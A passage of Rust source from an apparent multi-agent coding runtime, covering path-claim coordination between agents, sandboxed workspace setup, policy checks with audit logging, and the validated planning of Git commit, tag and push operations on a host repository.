        let bridge_token = self.memory_bridge_token.clone();
        if task_token.is_none() && bridge_token.is_none() {
            return;
        }
        let endpoint = format!("{url}/v1/sessions/revoke-by-task");
        let body = json!({ "task_id": task_id });
        let _ = tokio::task::spawn_blocking(move || {
            let mut request = ureq::post(&endpoint);
            if let Some(token) = task_token {
                request = request.set("x-aegis-task-token", &token);
            } else if let Some(token) = bridge_token {
                request = request.set("x-uomp-bridge-token", &token);
            }
            let _ = request.send_json(body);
        })
        .await;
    }

    /// Current claim table and its KV version (None if the key does not exist yet).
    pub async fn load_claims(&self, org_id: &str) -> anyhow::Result<(claims::ClaimTable, Option<u64>)> {
        let entry = self
            .org_storage
            .kv_get(org_id, claims::CLAIMS_NAMESPACE, claims::CLAIMS_KEY)
            .await?;
        Ok(match entry {
            Some(e) => (claims::parse_claims(&e.value), Some(e.version)),
            None => (claims::ClaimTable::new(), None),
        })
    }

    /// First conflict message for any of `paths` claimed by another live principal.
    pub async fn claim_conflict_for_paths(
        &self,
        identity: &AgentIdentity,
        paths: &[String],
    ) -> anyhow::Result<Option<String>> {
        if paths.is_empty() {
            return Ok(None);
        }
        let (table, _) = self.load_claims(&identity.org_id).await?;
        if table.is_empty() {
            return Ok(None);
        }
        let live = self.live_peer_ids(&identity.org_id).await;
        let now_ms = Utc::now().timestamp_millis();
        for p in paths {
            if let Some((glob, claim)) =
                claims::find_conflict(&table, p, &identity.agent_id, now_ms, |o| live.contains(o))
            {
                return Ok(Some(claims::conflict_message(glob, claim, p, now_ms)));
            }
        }
        Ok(None)
    }

    async fn announce_coordination(&self, identity: &AgentIdentity, subject: String, payload: Value) {
        let _ = self
            .ipc
            .send(IpcEnvelope {
                msg_id: String::new(),
                org_id: identity.org_id.clone(),
                from_agent: identity.agent_id.clone(),
                to_target: "topic:topic://coordination".to_string(),
                kind: IpcKind::TopicBroadcast {
                    topic: "topic://coordination".to_string(),
                },
                subject,
                payload,
                attachments: vec![],
                status: MessageDeliveryStatus::Unread,
                created_at_ms: 0,
            })
            .await;
    }

    /// `coord_claim` / `coord_release`: CAS read-modify-write of `coordination/claims` with retries,
    /// plus an automatic `topic://coordination` broadcast so peers learn about it via push hooks.
    async fn coord_claims_tool(
        &self,
        identity: &AgentIdentity,
        tool_name: &str,
        args: &Value,
    ) -> anyhow::Result<Value> {
        let paths: Vec<String> = args
            .get("paths")
            .and_then(|v| serde_json::from_value(v.clone()).ok())
            .unwrap_or_default();
        let ttl_secs = args
            .get("ttl_secs")
            .and_then(|v| v.as_i64())
            .filter(|t| *t > 0)
            .unwrap_or(claims::DEFAULT_CLAIM_TTL_SECS)
            .min(24 * 3600);
        let note = args.get("note").and_then(|v| v.as_str()).unwrap_or("").to_string();
        let claim_mode = args
            .get("mode")
            .and_then(|v| v.as_str())
            .map(|mode| {
                claims::ClaimMode::from_name(mode)
                    .ok_or_else(|| anyhow::anyhow!("coord_claim mode must be 'read' or 'write'"))
            })
            .transpose()?
            .unwrap_or(claims::ClaimMode::Write);
        if tool_name == "coord_claim" && paths.is_empty() {
            bail!("coord_claim requires a non-empty 'paths' array (globs relative to the repo root)");
        }
        let bound_task_id: Option<String> = args
            .get("task_id")
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty())
            .map(str::to_string)
            .or(self.active_task_id(identity).await);
        let workspace_files: Vec<String> = {
            let key = Self::agent_key(&identity.org_id, &identity.agent_id);
            let env_opt = self.agents.read().await.get(&key).cloned();
            if let Some(env) = env_opt {
                CoWWorkspace::collect_files(env.workspace.shadow_root())
                    .await
                    .unwrap_or_default()
                    .into_iter()
                    .map(|(rel, _)| rel)
                    .collect()
            } else {
                Vec::new()
            }
        };

        for _attempt in 0..8 {
            let (mut table, version) = self.load_claims(&identity.org_id).await?;
            let now_ms = Utc::now().timestamp_millis();
            claims::prune_expired(&mut table, now_ms);
            let live = self.live_peer_ids(&identity.org_id).await;
            let mut changed = Vec::new();
            let mut rejected = Vec::new();
            let expires_at_ms = now_ms + ttl_secs * 1000;

            if tool_name == "coord_claim" {
                for glob in &paths {
                    let clash = table.iter().find(|(g, c)| {
                        c.owner != identity.agent_id
                            && live.contains(&c.owner)
                            && (claim_mode == claims::ClaimMode::Write
                                || c.mode == claims::ClaimMode::Write)
                            && claims::globs_may_overlap(g, glob, &workspace_files)
                    });
                    match clash {
                        Some((g, c)) => rejected.push(json!({
                            "path": glob,
                            "held_by": c.owner,
                            "pattern": claims::claim_glob(g),
                            "mode": c.mode,
                            "expires_at_ms": c.expires_at_ms
                        })),
                        None => {
                            let key = claims::claim_key(glob, &identity.agent_id, claim_mode);
                            table.insert(
                                key,
                                claims::Claim {
                                    owner: identity.agent_id.clone(),
                                    expires_at_ms,
                                    note: note.clone(),
                                    task_id: bound_task_id.clone(),
                                    mode: claim_mode,
                                },
                            );
                            changed.push(glob.clone());
                        }
                    }
                }
            } else {
                let mine: Vec<String> = table
                    .iter()
                    .filter(|(g, c)| {
                        c.owner == identity.agent_id
                            && (paths.is_empty()
                                || paths.contains(g)
                                || paths.iter().any(|p| p == claims::claim_glob(g)))
                    })
                    .map(|(g, _)| g.clone())
                    .collect();
                for g in mine {
                    table.remove(&g);
                    changed.push(claims::claim_glob(&g).to_string());
                }
            }

            let value = serde_json::to_value(&table)?;
            match self
                .org_storage
                .kv_put(identity, claims::CLAIMS_NAMESPACE, claims::CLAIMS_KEY, value, version)
                .await
            {
                Ok(entry) => {
                    if !changed.is_empty() {
                        if let Some(ref tid) = bound_task_id {
                            let _ = self
                                .ipc
                                .record_task_claims(tid, &changed, tool_name != "coord_claim")
                                .await;
                        }
                        let verb = if tool_name == "coord_claim" { "claimed" } else { "released" };
                        if tool_name == "coord_claim" {
                            let claim_summary = if note.is_empty() {
                                format!("Owns {}", changed.join(", "))
                            } else {
                                format!("Owns {} ({})", changed.join(", "), note)
                            };
                            let claim_skills: Vec<AgentSkill> = changed
                                .iter()
                                .map(|g| AgentSkill {
                                    id: format!("claim:{}", g),
                                    name: format!("Claimed {}", g),
                                    description: claim_summary.clone(),
                                    tags: vec![
                                        "claimed".to_string(),
                                        identity.org_id.clone(),
                                        g.clone(),
                                    ],
                                })
                                .collect();
                            let _ = self
                                .ipc
                                .update_agent_card(identity, Some(claim_summary), claim_skills)
                                .await;
                        }
                        self.announce_coordination(
                            identity,
                            format!("[coord] {} {} {}", identity.agent_id, verb, changed.join(", ")),
                            json!({ "event": verb, "owner": identity.agent_id, "paths": changed, "expires_at_ms": expires_at_ms, "note": note }),
                        )
                        .await;
                    }
                    return Ok(json!({
                        "status": if rejected.is_empty() { "ok" } else { "partial" },
                        "agent_id": identity.agent_id,
                        "changed": changed,
                        "rejected": rejected,
                        "expires_at_ms": if tool_name == "coord_claim" { json!(expires_at_ms) } else { Value::Null },
                        "claims_version": entry.version
                    }));
                }
                Err(e) if e.to_string().contains("version mismatch") => continue,
                Err(e) => return Err(e),
            }
        }
        bail!("coord: could not update claims after 5 concurrent-modification retries")
    }

    /// Compact unread-mail summary piggybacked on every `tools/call` result, so clients without push
    /// hooks (e.g. Codex) still learn about peer messages on their next tool call.
    pub async fn inbox_summary(&self, identity: &AgentIdentity) -> Option<Value> {
        let msgs = self
            .ipc
            .peek_inbox(&identity.org_id, &identity.agent_id, 20)
            .await
            .ok()?;
        if msgs.is_empty() {
            return None;
        }
        let subjects: Vec<String> = msgs
            .iter()
            .take(3)
            .map(|m| format!("{} from {}: {}", m.msg_id, m.from_agent, m.subject))
            .collect();
        Some(json!({
            "unread": msgs.len(),
            "latest": subjects,
            "hint": "Read with ipc_recv, answer with ipc_send/ipc_reply, then ipc_ack."
        }))
    }

    pub async fn ensure_agent_environment(
        &self,
        identity: AgentIdentity,
        host_project_source: impl AsRef<Path>,
        tier: IsolationTier,
        subscribed_topics: Vec<String>,
    ) -> anyhow::Result<Arc<AgentEnvironment>> {
        self.ensure_org_vault(&identity.org_id).await?;
        let key = Self::agent_key(&identity.org_id, &identity.agent_id);
        if let Some(existing) = self.agents.read().await.get(&key) {
            if existing.workspace.shadow_root().join(".initialized").exists()
                || (existing.workspace.shadow_root().exists()
                    && existing
                        .workspace
                        .shadow_root()
                        .parent()
                        .is_some_and(|p| p.join(".initialized").exists())
                    && existing.workspace.host_source_root() == host_project_source.as_ref())
            {
                return Ok(existing.clone());
            }
        }

        let agent_root = self
            .runtime_data_root
            .join("orgs")
            .join(&identity.org_id)
            .join("agents")
            .join(&identity.agent_id);

        let cow_base = agent_root.join("cow_workspace");
        let agent_home = agent_root.join("home");
        let org_shared_ro = self
            .runtime_data_root
            .join("orgs")
            .join(&identity.org_id)
            .join("shared_ro");
        let org_agent_pub = self
            .runtime_data_root
            .join("orgs")
            .join(&identity.org_id)
            .join("pub")
            .join(&identity.agent_id);

        tokio::fs::create_dir_all(&agent_home).await?;
        tokio::fs::create_dir_all(&org_shared_ro).await?;
        tokio::fs::create_dir_all(&org_agent_pub).await?;

        let ws = Arc::new(CoWWorkspace::init(host_project_source.as_ref(), &cow_base).await?);

        let sbx_config = SandboxConfig {
            identity: identity.clone(),
            tier,
            limits: ResourceLimits::default(),
            workspace_dir: ws.shadow_root().to_path_buf(),
            agent_home_dir: agent_home,
            org_shared_ro_dir: org_shared_ro,
            org_agent_pub_dir: org_agent_pub,
            egress_proxy_addr: None,
            host_source_dir: Some(ws.host_source_root().to_path_buf()),
            tighten_home_read: true,
            allowed_loopback_ports: aos_sandbox::allocate_loopback_ports(2, &[]),
            isolate_loopback_only: true,
        };

        let driver: Box<dyn SandboxDriver> = match tier {
            IsolationTier::NativeOsSandbox => Box::new(NativeOsSandboxDriver),
            IsolationTier::MicroVm => Box::new(MicroVmSandboxDriver),
        };
        let sandbox = driver.create_sandbox(sbx_config).await?;

        self.ipc
            .register_peer(&identity, subscribed_topics)
            .await?;
        let _ = self
            .ipc
            .update_peer_metadata(
                &identity,
                None,
                None,
                None,
                Some(host_project_source.as_ref().display().to_string()),
            )
            .await;

        let env = Arc::new(AgentEnvironment {
            identity,
            workspace: ws,
            sandbox,
        });

        self.agents.write().await.insert(key, env.clone());
        Ok(env)
    }

    /// Triggers an automatic CoW rebase (`refresh_from_host`) for an already-initialized Agent environment.
    pub async fn refresh_agent_workspace(
        &self,
        identity: &AgentIdentity,
    ) -> anyhow::Result<aos_core::RefreshReport> {
        let key = Self::agent_key(&identity.org_id, &identity.agent_id);
        let Some(env) = self.agents.read().await.get(&key).cloned() else {
            return Ok(aos_core::RefreshReport::default());
        };
        env.workspace.refresh_from_host().await
    }

    /// Evicts in-memory sandbox handles for the specified agents when a Cloud Workspace transitions
    /// to Scale-to-Zero (`Hibernated`), while preserving CoW shadow directories on disk.
    pub async fn evict_agent_environments(&self, org_id: &str, agents: &[String]) -> usize {
        let mut guard = self.agents.write().await;
        let mut evicted = 0;
        for agent_id in agents {
            let key = Self::agent_key(org_id, agent_id);
            if guard.remove(&key).is_some() {
                evicted += 1;
            }
        }
        evicted
    }

    async fn authorize_and_audit(
        &self,
        identity: &AgentIdentity,
        action: &str,
        target_org_id: &str,
        target_resource: &str,
        mut metadata: Value,
    ) -> anyhow::Result<PolicyDecision> {
        if let Some(task_id) = self.active_task_id(identity).await {
            if let Some(object) = metadata.as_object_mut() {
                object.insert("task_id".to_string(), json!(task_id));
            }
        }
        let ctx = PolicyContext {
            principal: identity.clone(),
            action: action.to_string(),
            target_org_id: target_org_id.to_string(),
            target_resource: target_resource.to_string(),
            metadata: metadata.clone(),
        };
        let decision = self.policy.evaluate(&ctx).await?;
        let decision_label = match &decision {
            PolicyDecision::Allow { matched_rule } => format!("allow:{}", matched_rule),
            PolicyDecision::Ask { escalation_id, .. } => format!("ask:{}", escalation_id),
            PolicyDecision::Deny { .. } => "deny".to_string(),
        };

        self.recorder
            .record(AuditEvent {
                event_id: format!("evt-{}", &Uuid::new_v4().to_string()[..8]),
                timestamp_ms: Utc::now().timestamp_millis(),
                org_id: identity.org_id.clone(),
                agent_id: identity.agent_id.clone(),
                action: action.to_string(),
                resource: target_resource.to_string(),
                policy_decision: decision_label,
                snapshot_id: None,
                details: metadata,
                task_id: None,
                prev_hash: None,
                event_hash: None,
            })
            .await?;

        Ok(decision)
    }

    async fn memory_policy_evaluate(
        &self,
        identity: &AgentIdentity,
        args: Value,
    ) -> anyhow::Result<Value> {
        let action = args
            .get("action")
            .and_then(|v| v.as_str())
            .unwrap_or("read");
        let resource = args
            .get("resource")
            .and_then(|v| v.as_str())
            .context("Missing 'resource' (e.g. memory:tag:notes/projects)")?;
        let memory_action = match action {
            "read" => MemoryAction::Read,
            "write" => MemoryAction::Write,
            "delete" => MemoryAction::Delete,
            other => bail!("Unknown memory action '{}'", other),
        };

        let decision = self
            .authorize_and_audit(
                identity,
                memory_action.as_str(),
                &identity.org_id,
                resource,
                json!({
                    "protocol": "uomp",
                    "protocol_version": "1.0",
                    "resource": resource,
                }),
            )
            .await?;

        Ok(match decision {
            PolicyDecision::Allow { matched_rule } => json!({
                "protocol": "uomp",
                "decision": "allow",
                "action": memory_action.as_str(),
                "resource": resource,
                "matched_rule": matched_rule,
            }),
            PolicyDecision::Ask {
                escalation_id,
                reason,
                suggested_lease_scope,
            } => json!({
                "protocol": "uomp",
                "decision": "ask",
                "action": memory_action.as_str(),
                "resource": resource,
                "escalation_id": escalation_id,
                "reason": reason,
                "suggested_lease_scope": suggested_lease_scope,
            }),
            PolicyDecision::Deny { reason } => json!({
                "protocol": "uomp",
                "decision": "deny",
                "action": memory_action.as_str(),
                "resource": resource,
                "reason": reason,
            }),
        })
    }

    async fn prepare_workspace_git_plan(
        &self,
        env: &AgentEnvironment,
        identity: &AgentIdentity,
        args: &Value,
    ) -> anyhow::Result<(HostGitPlan, String, Vec<aos_core::FileDiffEntry>, Value)> {
        let host_root = std::fs::canonicalize(env.workspace.host_source_root())
            .unwrap_or_else(|_| env.workspace.host_source_root().to_path_buf());
        if !host_root.join(".git").exists() {
            bail!(
                "Host workspace '{}' is not a Git repository",
                host_root.display()
            );
        }
        let git_bin = resolve_system_git_binary()?;

        let raw_paths: Vec<String> = args
            .get("paths")
            .and_then(|v| serde_json::from_value(v.clone()).ok())
            .unwrap_or_default();
        let mut paths = validate_repo_relative_paths(raw_paths, "workspace_git")?;

        let auto_commit_shadow = args
            .get("auto_commit_shadow")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        let overwrite_binaries = args
            .get("overwrite_binaries")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        let skip_verify = args
            .get("skip_verify")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        let (configured_verify_cmd, verify_cmd, verify_timeout_ms) =
            resolve_workspace_verify_config(&host_root, args, skip_verify);

        let checkout_branch = args
            .get("checkout_branch")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(str::to_string);
        let create_branch = args
            .get("create_branch")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        if let Some(ref cb) = checkout_branch {
            if !is_safe_git_ref_name(&git_bin, &host_root, cb) {
                bail!("Invalid Git checkout branch name '{}'", cb);
            }
            if create_branch {
                let exists = run_sanitized_host_git(
                    &git_bin,
                    &host_root,
                    &[],
                    &[
                        "rev-parse".to_string(),
                        "-q".to_string(),
                        "--verify".to_string(),
                        format!("refs/heads/{cb}"),
                    ],
                )
                .map(|o| o.status.success())
                .unwrap_or(false);
                if exists {
                    bail!(
                        "Branch '{}' already exists on host; omit create_branch or set create_branch: false to switch to it",
                        cb
                    );
                }
            }
        }

        let sync_mode = match args
            .get("sync")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
        {
            Some(s @ ("fetch" | "pull_ff_only" | "pull_rebase")) => Some(s.to_string()),
            Some(other) => bail!(
                "Invalid workspace_git sync mode '{}'; expected 'fetch', 'pull_ff_only', or 'pull_rebase'",
                other
            ),
            None => None,
        };

        let commit_message = match args.get("commit_message").and_then(|v| v.as_str()) {
            Some(raw) => {
                if raw.contains('\0') || raw.len() > 16 * 1024 {
                    bail!("Invalid 'commit_message' in workspace_git");
                }
                let trimmed = raw.trim();
                (!trimmed.is_empty()).then(|| trimmed.to_string())
            }
            None => None,
        };

        let mut trailers = Vec::new();
        if let Some(arr) = args.get("trailers").and_then(|v| v.as_array()) {
            for item in arr {
                if let Some(s) = item.as_str() {
                    if s.contains('\0') || s.len() > 4096 {
                        bail!("Invalid trailer in workspace_git");
                    }
                    let t = s.trim();
                    if !t.is_empty() {
                        trailers.push(t.to_string());
                    }
                }
            }
        }

        let tag = args
            .get("tag")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(str::to_string);
        let force_tag = args
            .get("force_tag")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        let push = args.get("push").and_then(|v| v.as_bool()).unwrap_or(false);
        let force_push = args
            .get("force_push")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        if force_push && !push {
            bail!("'force_push: true' requires 'push: true'");
        }
        let remote = args
            .get("remote")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .unwrap_or("origin")
            .to_string();
        let branch_arg = args.get("branch").and_then(|v| v.as_str());

        if auto_commit_shadow {
            let _ = env.workspace.refresh_from_host().await;
        }
        let shadow_changed = env
            .workspace
            .changed_since_baseline()
            .await
            .unwrap_or_default();
        if auto_commit_shadow && paths.is_empty() && commit_message.is_some() && !shadow_changed.is_empty() {
            paths = shadow_changed.clone();
        }

        if !auto_commit_shadow
            && checkout_branch.is_none()
            && sync_mode.is_none()
            && commit_message.is_none()
            && tag.is_none()
            && !push
        {
            bail!("workspace_git requires at least one of 'commit_message', 'tag', 'push: true', 'checkout_branch', 'sync', or 'auto_commit_shadow: true'");
        }
        if commit_message.is_some() && paths.is_empty() {
            bail!(
                "workspace_git requires explicit repo-relative 'paths' (or uncommitted CoW edits with auto_commit_shadow: true) when 'commit_message' is set"
            );
        }
        if commit_message.is_none() && !paths.is_empty() && !auto_commit_shadow {
            bail!(
                "workspace_git received 'paths' without 'commit_message'; pass 'commit_message' to commit those files or omit 'paths'"
            );
        }

        let shadow_paths: Vec<String> = if auto_commit_shadow {
            if !paths.is_empty() {
                paths
                    .iter()
                    .filter(|p| shadow_changed.iter().any(|s| s == *p))
                    .cloned()
                    .collect()
            } else {
                shadow_changed.clone()
            }
        } else {
            for p in &paths {
                if shadow_changed.iter().any(|s| s == p) {
                    bail!(
                        "Path '{}' still has uncommitted changes in your CoW shadow workspace; call 'workspace_commit' first (or pass auto_commit_shadow: true) before 'workspace_git'",
                        p
                    );
                }
            }
            Vec::new()
        };

        let mut claim_check_paths = paths.clone();
        for sp in &shadow_paths {
            if !claim_check_paths.contains(sp) {
                claim_check_paths.push(sp.clone());
            }
        }
        if !claim_check_paths.is_empty() {
            if let Some(msg) = self.claim_conflict_for_paths(identity, &claim_check_paths).await? {
                bail!("{}", msg);
            }
        }

        let mut shadow_diffs: Vec<aos_core::FileDiffEntry> = Vec::new();
        let mut shadow_evidence_hash: Option<String> = None;
        if auto_commit_shadow && !shadow_paths.is_empty() {
            let base_dir = env
                .workspace
                .shadow_root()
                .parent()
                .map(|p| p.join("baseline_snapshot"))
                .filter(|p| p.exists())
                .unwrap_or_else(|| env.workspace.host_source_root().to_path_buf());
            let sd = CoWWorkspace::diff_dirs(
                &base_dir,
                env.workspace.shadow_root(),
                Some(&shadow_paths),
            )
            .await?;
            let (_, ev_h) = aos_core::compute_diff_evidence(&sd, overwrite_binaries, skip_verify);
            shadow_diffs = sd;
            shadow_evidence_hash = Some(ev_h);
        }

        let host_only_paths: Vec<String> = paths
            .iter()
            .filter(|p| !shadow_paths.contains(p))
            .cloned()
            .collect();
        if commit_message.is_some() && !host_only_paths.is_empty() {
            let mut status_args = vec![
                "status".to_string(),
                "--porcelain".to_string(),
                "--untracked-files=all".to_string(),
                "--".to_string(),
            ];
            status_args.extend(host_only_paths.iter().cloned());
            let status_out = run_sanitized_host_git(&git_bin, &host_root, &[], &status_args)?;
            if !status_out.status.success() {
                bail!(
                    "git status failed on host repo '{}': {}",
                    host_root.display(),
                    String::from_utf8_lossy(&status_out.stderr).trim()
                );
            }
            if String::from_utf8_lossy(&status_out.stdout).trim().is_empty() {
                bail!(
                    "No uncommitted host changes found in {:?}; nothing to commit (did you call workspace_commit or pass auto_commit_shadow: true?)",
                    host_only_paths
                );
            }
        }

        let head_out = run_sanitized_host_git(
            &git_bin,
            &host_root,
            &[],
            &["rev-parse".to_string(), "--verify".to_string(), "HEAD".to_string()],
        )?;
        let head_sha = if head_out.status.success() {
            String::from_utf8_lossy(&head_out.stdout).trim().to_string()
        } else {
            "UNBORN".to_string()
        };

        if let Some(ref t) = tag {
            if !is_safe_git_ref_name(&git_bin, &host_root, t) {
                bail!("Invalid Git tag name '{}'", t);
            }
            if !force_tag {
                let exists = run_sanitized_host_git(
                    &git_bin,
                    &host_root,
                    &[],
                    &[
                        "rev-parse".to_string(),
                        "-q".to_string(),
                        "--verify".to_string(),
                        format!("refs/tags/{t}"),
                    ],
                )
                .map(|o| o.status.success())
                .unwrap_or(false);
                if exists {
                    bail!(
                        "Git tag '{}' already exists on host; pass force_tag: true to move it",
                        t
                    );
                }
            }
        }

        let mut remote_url = None;
        let mut push_branch = None;
        if push || sync_mode.is_some() {
            if !is_safe_remote_name(&remote) {
                bail!(
                    "Invalid Git remote name '{}' (raw URLs and flags are forbidden; use a configured remote name like 'origin')",
                    remote
                );
            }
            let url_out = run_sanitized_host_git(
                &git_bin,
                &host_root,
                &[],
                &[
                    "remote".to_string(),
                    "get-url".to_string(),
                    "--".to_string(),
                    remote.clone(),
                ],
            )?;
            if !url_out.status.success() {
                bail!(
                    "Git remote '{}' is not configured in host repository '{}'",
                    remote,
                    host_root.display()
                );
            }
            remote_url = Some(String::from_utf8_lossy(&url_out.stdout).trim().to_string());

            push_branch = match branch_arg {
                Some(s) if s.trim().is_empty() => {
                    if !push || tag.is_some() {
                        None
                    } else {
                        bail!("Empty 'branch' in workspace_git push requires 'tag' to be set");
                    }
                }
                Some(s) => {
                    let b = s.trim().to_string();
                    if !is_safe_git_ref_name(&git_bin, &host_root, &b) {
                        bail!("Invalid Git branch name '{}'", b);
                    }
                    Some(b)
                }
                None => {
                    if let Some(ref cb) = checkout_branch {
                        Some(cb.clone())
                    } else {
                        let sym = run_sanitized_host_git(
                            &git_bin,
                            &host_root,
                            &[],
                            &[
                                "symbolic-ref".to_string(),
                                "--quiet".to_string(),
                                "--short".to_string(),
                                "HEAD".to_string(),
                            ],
                        )?;
                        if sym.status.success() {
                            let b = String::from_utf8_lossy(&sym.stdout).trim().to_string();
                            (!b.is_empty()).then_some(b)
                        } else if !push || tag.is_some() {
                            None
                        } else {
                            bail!("Host repository HEAD is detached; specify an explicit 'branch' or 'tag' to push");
                        }
                    }
                }
            };
        }

        let mut file_hashes: Vec<(String, String)> = Vec::with_capacity(paths.len());
        let mut diffs: Vec<aos_core::FileDiffEntry> =
            Vec::with_capacity(shadow_diffs.len() + paths.len() + 1);

        let mut plan_lines = vec![
            "--- a/.git/OPERATION_PLAN".to_string(),
            "+++ b/.git/OPERATION_PLAN".to_string(),
            "@@ Host Git Boundary Plan @@".to_string(),
            format!("+Repository: {}", host_root.display()),
            format!("+Base HEAD:  {}", head_sha),
        ];
        if auto_commit_shadow {
            plan_lines.push(format!(
                "+AutoShadow: true ({} file(s), skip_verify={}, verify_cmd={})",
                shadow_paths.len(),
                skip_verify,
                verify_cmd.as_deref().unwrap_or("<none>")
            ));
        }
        if let Some(ref cb) = checkout_branch {
            plan_lines.push(format!("+Checkout:  {} (create={})", cb, create_branch));
        }
        if let Some(ref sm) = sync_mode {
            plan_lines.push(format!("+Sync:      {} ({})", sm, remote));
        }
        if !paths.is_empty() {
            plan_lines.push(format!("+Paths:     {}", paths.join(", ")));
        }
        if let Some(ref msg) = commit_message {
            plan_lines.push(format!("+Commit:    {}", msg.lines().next().unwrap_or(msg)));
        }
        for t in &trailers {
            plan_lines.push(format!("+Trailer:   {}", t));
        }
        if let Some(ref t) = tag {
            plan_lines.push(format!("+Tag:       {} (force={})", t, force_tag));
        }
        if push {
            plan_lines.push(format!(
                "+Push:      {} ({}) | branch={} | tag={} | force_push={}",
                remote,
                remote_url.as_deref().unwrap_or("?"),
                push_branch.as_deref().unwrap_or("-"),
                tag.as_deref().unwrap_or("-"),
                force_push
            ));
        }
        diffs.push(aos_core::FileDiffEntry {
            relative_path: ".git/OPERATION_PLAN".to_string(),
            change_type: DiffChangeType::Modified,
            old_size: None,
            new_size: None,
            preview_diff: Some(plan_lines.join("\n")),
            old_sha256: None,
            new_sha256: None,
        });
        diffs.extend(shadow_diffs);

        for p in &host_only_paths {
            let full = host_root.join(p);
            let meta_opt = std::fs::symlink_metadata(&full).ok();
            let (hash_str, change_type, new_size) = match meta_opt {
                Some(ref m) if m.file_type().is_symlink() => {
                    let link = std::fs::read_link(&full)?;
                    let link_bytes = link.to_string_lossy().as_bytes().to_vec();
                    let h = hex::encode(Sha256::digest(&link_bytes));
                    (format!("symlink:{h}"), DiffChangeType::Modified, Some(link_bytes.len() as u64))
                }
                Some(ref m) if m.is_file() => {
                    let bytes = tokio::fs::read(&full).await?;
                    let h = hex::encode(Sha256::digest(&bytes));
                    let ct = if head_sha == "UNBORN" {
                        DiffChangeType::Added
                    } else {
                        DiffChangeType::Modified
                    };
                    (format!("sha256:{h}"), ct, Some(bytes.len() as u64))
                }
                Some(_) => {
                    bail!(
                        "Path '{}' is a directory; pass explicit file paths to workspace_git",
                        p
                    );
                }
                None => ("DELETED".to_string(), DiffChangeType::Deleted, Some(0)),
            };
            file_hashes.push((p.clone(), hash_str.clone()));

            let mut preview: Option<String> = None;
            if head_sha != "UNBORN" {
                if let Ok(d_out) = run_sanitized_host_git(
                    &git_bin,
                    &host_root,
                    &[],
                    &[
                        "diff".to_string(),
                        "--no-ext-diff".to_string(),
                        "--no-textconv".to_string(),
                        "HEAD".to_string(),
                        "--".to_string(),
                        p.clone(),
                    ],
                ) {
                    if d_out.status.success() {
                        let s = String::from_utf8_lossy(&d_out.stdout).to_string();
                        if !s.trim().is_empty() {
                            preview = Some(s.chars().take(16 * 1024).collect());
                        }
                    }
                }
            }
            if preview.is_none() && full.is_file() {
                if let Ok(bytes) = tokio::fs::read(&full).await {
                    preview = Some(match String::from_utf8(bytes) {
                        Ok(txt) => {
                            let lines: Vec<String> = txt
                                .lines()
                                .take(80)
                                .map(|l| format!("+{l}"))
                                .collect();
                            format!("--- /dev/null\n+++ b/{p}\n{}", lines.join("\n"))
                        }
                        Err(e) => {
                            format!("--- /dev/null\n+++ b/{p}\n+[binary {} bytes]", e.into_bytes().len())
                        }
                    });
                }
            }
            diffs.push(aos_core::FileDiffEntry {
                relative_path: p.clone(),
                change_type,
                old_size: None,
                new_size,
                preview_diff: preview,
                old_sha256: None,
                new_sha256: Some(hash_str),
            });
        }

        let canonical_plan = serde_json::to_vec(&json!({
            "host_root": host_root.display().to_string(),
            "head_sha": head_sha,
            "file_hashes": file_hashes,
            "auto_commit_shadow": auto_commit_shadow,
            "shadow_paths": shadow_paths,
            "shadow_evidence_hash": shadow_evidence_hash,
            "overwrite_binaries": overwrite_binaries,
            "skip_verify": skip_verify,
            "verify_cmd": verify_cmd,
            "checkout_branch": checkout_branch,
            "create_branch": create_branch,
            "sync_mode": sync_mode,
            "commit_message": commit_message,
            "trailers": trailers,
            "tag": tag,
            "force_tag": force_tag,
            "push": push,
            "force_push": force_push,
            "remote": remote,
            "remote_url": remote_url,
            "branch": push_branch,
        }))?;
        let evidence_hash = hex::encode(Sha256::digest(&canonical_plan));

        let mut target_resource = if push {
            let base = format!(
                "git:{}#push:{}:branch={},tag={},force_tag={}",
                host_root.display(),
                remote,
                push_branch.as_deref().unwrap_or("-"),
                tag.as_deref().unwrap_or("-"),
                force_tag
            );
            if force_push {
                format!("{base},force_push=true")
            } else {
                base
            }
        } else if let Some(t) = tag.as_deref().filter(|_| force_tag) {
            format!("git:{}#local:force_tag={}", host_root.display(), t)
        } else if let Some(ref sm) = sync_mode {
            format!("git:{}#sync:{}:{}", host_root.display(), remote, sm)
        } else if let Some(ref cb) = checkout_branch {
            format!("git:{}#checkout:{}", host_root.display(), cb)
        } else {
            format!("git:{}#local", host_root.display())
        };
        if !push && auto_commit_shadow && !shadow_paths.is_empty() && sync_mode.is_none() && checkout_branch.is_none() && tag.is_none() {
            // Keep clean `#local` prefix with explicit shadow indicator only when needed.
            target_resource = format!("git:{}#local:auto_shadow", host_root.display());
        }

        let meta = json!({
            "host_root": host_root.display().to_string(),
            "head_sha": head_sha,
            "paths": paths,
            "shadow_paths": shadow_paths,
            "auto_commit_shadow": auto_commit_shadow,
            "verify_cmd": verify_cmd,
            "has_configured_verify_cmd": configured_verify_cmd.is_some(),
            "overwrite_binaries": overwrite_binaries,
            "skip_verify": skip_verify,
            "checkout_branch": checkout_branch,
            "create_branch": create_branch,
            "sync": sync_mode,
            "commit_message": commit_message,
            "trailers": trailers,
            "tag": tag,
            "force_tag": force_tag,
            "push": push,
            "force_push": force_push,
            "remote": (push || sync_mode.is_some()).then_some(&remote),
            "remote_url": remote_url,
            "branch": push_branch,
            "evidence_hash": evidence_hash,
            "evidence": {
                "host_root": host_root.display().to_string(),
                "paths": paths,
                "shadow_paths": shadow_paths,
                "auto_commit_shadow": auto_commit_shadow,
                "checkout_branch": checkout_branch,
                "create_branch": create_branch,
                "sync": sync_mode,
                "commit_message": commit_message,
                "tag": tag,
                "force_tag": force_tag,
                "push": push,
                "force_push": force_push,
                "branch": push_branch,
                "evidence_hash": evidence_hash,
            },
        });

        let plan = HostGitPlan {
            git_bin,
            host_root,
